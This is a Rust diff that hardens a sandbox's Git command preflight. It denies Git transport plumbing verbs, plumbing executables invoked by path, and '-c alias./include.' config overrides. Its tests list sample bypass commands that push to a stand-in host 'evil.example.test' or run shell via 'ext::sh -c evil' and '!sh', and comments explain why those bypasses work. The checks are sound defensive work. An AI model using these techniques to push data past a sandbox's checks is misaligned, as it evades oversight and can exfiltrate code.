@@ -657,6 +657,14 @@ fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -
                 return scan_shell_c(words, index, preflight, depth);
             }
             "git" => return inspect_git_command(&words[index..], preflight),
+            // Git's plumbing executables are not subcommands, so they bypass
+            // `inspect_git_command` entirely when invoked by path. They take
+            // the same unscreened remote destinations.
+            name if is_git_plumbing_executable(name) => {
+                return Err(denied(format!(
+                    "{name} is not supported by manifest Git preflight"
+                )));
+            }
             _ => return Ok(()),
         }
     }
@@ -730,7 +738,21 @@ fn scan_shell_c(
 /// Configuration keys that could redirect a granted remote alias, log in, or
 /// rewrite a granted URL. A command-line override of one of these would make
 /// the alias/URL check describe a different destination than git contacts.
-const REDIRECTING_CONFIG_KEYS: &[&str] = &["remote.", "url.", "credential.", "http.extraheader"];
+///
+/// `alias.` and `include.`/`includeIf.` belong here for the same reason at the
+/// verb level: an alias renames the subcommand the scan sees, and an include
+/// pulls in whatever the included file defines. Verified with real git —
+/// `git -c alias.q=push q <url> HEAD:refs/heads/x` pushes, and so does the
+/// alias `z = push` loaded through `-c include.path=<file>`.
+const REDIRECTING_CONFIG_KEYS: &[&str] = &[
+    "remote.",
+    "url.",
+    "credential.",
+    "http.extraheader",
+    "alias.",
+    "include.",
+    "includeif.",
+];
 
 /// `-c`, `-cNAME=VALUE`, `--config NAME=VALUE`, `--config=NAME=VALUE`,
 /// `--config-env NAME=ENVVAR`, and the `=` spellings. The host pins granted
@@ -851,8 +873,34 @@ fn inspect_git_command(words: &[Word], preflight: Preflight<'_>) -> Result<()> {
         "remote" => authorize_remote_subcommand(args, preflight),
         "archive" => authorize_archive(args, preflight),
         "submodule" => authorize_submodule(args, preflight),
+        // Porcelain `push` is not the only path to a remote. The plumbing
+        // verbs speak the transport protocol directly, take their own
+        // destination argument, and are not authorized above, so they must
+        // not inherit the catch-all.
+        verb if is_remote_transport_plumbing(verb) => Err(denied(format!(
+            "git {verb} is not supported by manifest Git preflight"
+        ))),
         _ => Ok(()),
     }
+}
+
+/// Git's remote transport plumbing. `send-pack`/`http-push` write to the
+/// remote, `fetch-pack`/`http-fetch` read arbitrary objects, and the
+/// `remote-*` helpers are the transport binaries Git itself drives. All of
+/// them take a remote destination that this preflight does not authorize, so
+/// they cannot inherit the catch-all arm.
+fn is_remote_transport_plumbing(verb: &str) -> bool {
+    matches!(
+        verb,
+        "send-pack" | "fetch-pack" | "http-push" | "http-fetch"
+    ) || verb.starts_with("remote-")
+}
+
+/// The same plumbing, invoked as a standalone executable by path (usually
+/// `/usr/lib/git-core/git-send-pack`) rather than as a `git` subcommand.
+fn is_git_plumbing_executable(name: &str) -> bool {
+    name.strip_prefix("git-")
+        .is_some_and(is_remote_transport_plumbing)
 }
 
 fn authorize_clone(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
@@ -1432,6 +1480,85 @@ mod tests {
             assert!(
                 error.to_string().contains("git push is not supported"),
                 "{error}"
+            );
+        }
+    }
+
+    #[test]
+    fn preflight_refuses_remote_transport_plumbing_verbs() {
+        let (_temp, grant) = workspace_with_remote();
+        for command in [
+            "git send-pack https://evil.example.test/repo.git HEAD:refs/heads/spliced",
+            "git send-pack /workspace/remotes/origin.git HEAD:refs/heads/spliced",
+            "git send-pack",
+            "git fetch-pack https://evil.example.test/repo.git",
+            "git fetch-pack /workspace/remotes/origin.git",
+            "git http-push https://evil.example.test/repo.git",
+            "git http-fetch origin",
+            "git remote-https origin https://evil.example.test/repo.git",
+            "git remote-ext origin ext::sh -c evil",
+            "true && git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x",
+            "sh -c 'git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x'",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+            assert!(
+                error.to_string().contains("not supported by manifest Git preflight"),
+                "{command}: {error}"
+            );
+        }
+        // The plumbing verbs are refused even with no grant and no network.
+        for command in ["git send-pack . HEAD:refs/heads/x", "git fetch-pack ."] {
+            let error =
+                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // Invoked by path, the plumbing executables are not `git` subcommands.
+        for command in [
+            "/usr/lib/git-core/git-send-pack /workspace/remotes/origin.git HEAD:refs/heads/x",
+            "/usr/lib/git-core/git-fetch-pack https://evil.example.test/repo.git",
+            "/usr/lib/git-core/git-remote-https origin https://evil.example.test/repo.git",
+            "env /usr/lib/git-core/git-send-pack https://evil.example.test/repo.git HEAD:x",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+    }
+
+    #[test]
+    fn command_line_config_cannot_redefine_the_scanned_verb() {
+        let (_temp, grant) = workspace_with_remote();
+        // Honest commands still run; the refusal is scoped to the overrides
+        // that change what the scan is looking at.
+        for command in [
+            "git -c user.name=fixture status",
+            "git -c core.pager=cat log -1",
+            "git config --get remote.origin.url",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
+        }
+        for command in [
+            "git -c alias.q=push q https://evil.example.test/repo.git HEAD:refs/heads/x",
+            "git -calias.q=push q origin HEAD:refs/heads/x",
+            "git --config alias.q=push q origin HEAD:refs/heads/x",
+            "git --config=alias.q=push q origin HEAD:refs/heads/x",
+            "git -c include.path=/tmp/evil.cfg q origin HEAD:refs/heads/x",
+            "git -c includeIf.gitdir:/workspace/.path=/tmp/evil.cfg q origin",
+            "git -c alias.b=!sh b",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
             );
         }
     }
